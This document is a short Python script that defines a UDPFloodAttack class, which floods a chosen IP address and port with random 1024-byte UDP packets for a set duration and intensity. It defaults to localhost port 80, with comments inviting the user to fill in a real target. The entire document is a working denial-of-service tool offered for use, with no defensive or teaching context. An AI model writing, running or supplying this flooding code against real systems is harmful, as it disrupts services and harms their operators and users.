import socket
import random
import time

class UDPFloodAttack:
    def __init__(self, target, port, duration, intensity):
        self.target = target
        self.port = port
        self.duration = duration
        self.intensity = intensity
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def start_attack(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            for i in range(self.intensity):
                self.sock.sendto(random._urandom(1024), (self.target, self.port))

    def stop_attack(self):
        self.sock.close()

if __name__ == '__main__':
    target_ip = '127.0.0.1'  # Specify the target IP address here
    target_port = 80  # Specify the target port here
    attack_duration = 60  # Specify the attack duration in seconds
    attack_intensity = 10  # Specify the attack intensity

    udp_flood_attack = UDPFloodAttack(target_ip, target_port, attack_duration, attack_intensity)
    udp_flood_attack.start_attack()